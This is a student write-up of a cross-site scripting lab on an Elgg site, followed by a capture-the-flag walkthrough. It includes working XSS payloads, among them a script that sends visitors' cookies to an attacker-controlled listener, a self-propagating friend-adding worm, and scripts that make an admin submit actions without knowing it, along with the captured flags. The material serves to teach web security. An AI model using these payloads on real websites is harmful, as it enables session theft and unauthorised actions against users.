## Cross-Site Scripting Attack Lab

### Task 1
In this task we're asked to inject javascript code into a user's profile such that when that profile is loaded, an alert popup will show up with the message "XSS". <br>
In order to do so, firstly, we need to login into an user account. We chose Alice.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049736125780070481/image.png">

Then, we changed her Brief Description section to contain our javascript code: `<script>alert('XSS');</script>`

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049741154406633533/image.png">

Upon submiting the edit form, we're met with the expected popup, since the page reloads. Because the privacy of Alice's Brief Description section is set to public, any user that loads her profile should be met with the exact same popup.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049741154767347732/image.png">

### Task 2

With a small change to our code, we can display the user's cookies, instead of a random message: `<script>alert(document.cookie);</script>`

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049742743523578026/image.png">

Yet again, any user that loads this page will be met with the popup.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049742660442796092/image.png">

### Task 3

Because displaying the cookies to the user is not useful to us (it's beyond useless, since it actually warns the user that their cookies are under attack), we want to silently retrieve them. <br>
This can be achieved with a small piece of javascript code that creates a new `<img>` html element with its source pointing to a server we control, created using netcat: `<script>document.write(’<img src=http://10.9.0.1:5555?c=’+ escape(document.cookie) + ’ >’);</script>` <br>
When the browser tries to retrieve this image, it will send a GET request to our server with the cookie information attached.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049744046450548736/image.png">

As you can see, the browser sent the GET request, and it got to our server.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049744563364954122/image.png">

### Task 4

Our objective is to create and inject a piece of javascript code onto the website that will add Samy as a friend to anyone that loads Alice's profile. <br>
In order to do so, we need to know the request's structure. <br>
We achieved this by logging into Boby's account and adding Samy as a friend, all while having the Firefox's dev tools open recording all the HTTP requests sent. 

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049749147097497670/image.png">

Now that we know what action is invoked and what arguments are passed, we can create the script we'll be injecting in Alice's account description. <br>
The request receives as arguments some sort of user identifier passed in the "friend" field, in Samy's case it's 59, and two Elgg fields: __elgg_ts and __elgg_token. <br>
With this in mind, using the given code, we can easily build our script and place it into Alice's description.

```html
<script type="text/javascript">
        window.onload = function () {
                var Ajax=null;
                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // ➀
                var token="&__elgg_token="+elgg.security.token.__elgg_token; // ➁

                //Construct the HTTP request to add Samy as a friend.
                var friend="friend=59"; //Samy's friend "code"
                
                var sendurl="http://www.seed-server.com/action/friends/add?"+friend+ts+token+ts+token; 

                //Create and send Ajax request to add friend
                Ajax=new XMLHttpRequest();
                Ajax.open("GET", sendurl, true);
                Ajax.send();
        }
</script>
```

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751088439509072/image.png">

- Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?
    - R: The purpose of the lines is to retrieve the information needed for the __elgg_ts and __elgg_token fields from the user's security token, which is unique. This was we can generalize the attack to work on any user that loads the vulnerable page.
- Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?
    - R: Yes. Despite Editor mode adding aditional HTML code to our code, rendering the way we're using to inject our worm onto the website useless, we could still use a different method, like the one explained earlier in this lab's tutorial. Assuming the other fields are still present, like the Brief Description field, we could insert a small script tag that redirects to our worm code, in another server.

We know that, before placing our code in Alice's profile, Alice is not friends with Samy.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751572764172389/image.png">

This changes after reloading the page, confirming that our worm is successful in it's job.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751331855933451/image.png">
<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751476592988240/image.png">

Just to make sure, we tested this with an unsuspecting victim, Charlie.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751788795985942/image.png">
<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049751987354357771/image.png">
<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049752115351928962/image.png">

## Week 10 CTF Challenge
### Challenge 1

Initially, upon loading the website, we're met with a single input field, which automatically made us think of XSS attacks, so, to test this hypothesis, we tried to inject a simple javascript script that would output "teste" to the console.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049766868950458388/image.png">

This form is indeed vulnerable to XSS attacks, confirmed by the output in the console. <br>
(We totally didn't try anything prior to this using the alert() function which didn't leave our browser with a near permanent popup)

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049766984658718810/image.png">

On this new page, that mirrors the admin page with a few changes, we found two disabled buttons and a textbox with our previous input. <br>
We proceeded to analyze the html code of the webpage, trying to find anything we could use to submit the "Give the flag" form, sending an HTTP request to the responsible action. <br>

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049767167308083240/image.png">

Because the action is not visible on the html, we found a workaround, which consisted of injecting javascript code that would enable the "Give the flag" button so that we could press it in order to try and trigger the action.

```html
<script> 
    document.getElementById('giveflag').removeAttribute("disabled");
</script>
```

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049768734316822538/image.png">

This worked, and the button (actually, it's not a button, it's an input with type submit but it essentially works like a button, so we'll keep refering to it as one) was now clickable.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049769572653338674/image.png">

A new problem arose, when we clicked it, because we got met by a 403 Forbidden access page, meaning whoever built the website put in place policies preventing users from submiting HTTP requests only admins should be able to. 

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049769590974066698/image.png">

This is not so bad because now we know what the POST HTTP request is, so all we need to do is find a way to have the admin submit the request unwillingly. <br>
In order to do so, we put together a bit of js code that would build and send this POST request and injected it onto the justification textbox so that when the admin loaded the page it would run and, hopefully, authorize the request.

```html
<script type="text/javascript">
        window.onload = function () {
                var Ajax=null;
                
		        //Current URL can be sent via POST
                var sendurl= window.location.href";

                //Create and send Ajax request to add friend
                Ajax=new XMLHttpRequest();
                Ajax.open("POST", sendurl, true);
                Ajax.send();
        }
</script>
```

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049782278873694238/image.png">

Turns out this actually works, and we got presented with the flag (flag{cc4b37d6a3dc659d16c8e714a21b41eb}).

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049774828267253870/image.png">

But we knew this wasn't the only method there was to get the flag. <br>
Since it's stated that the admin always clicks the "Mark request as read" button, we wanted to try and make it so that this button, instead of submiting it's own form, would submit the "Give the flag" form. <br>
This is very easily done with some basic javascript knowledge: all we have to do is change the onclick function of this button and make it click the other button, submiting the other form. To make sure the "Mark request as read" form is not submited, we disable the submit feature of this button by returning false on it's onclick function.

 ```html
<script>document.getElementById('markAsRead').onclick=function() {document.getElementById('giveflag').click(); return false;}</script>
 ```

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049774753457651772/image.png">

Like expected, this works, and we get the same flag as we did before.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049774828267253870/image.png">


Note: while testing the methods documented here at a later time, for writting purposes, we found that the flag changed from flag{cc4b37d6a3dc659d16c8e714a21b41eb} to flag{0272a7849282b7ee095c5ee1ede48692}. We're not sure as to why this happened, but our best guess is that this is an anti-cheating feature that checks when a flag is submited and changes it, making it subjectively harder to copy.

### Challenge 2

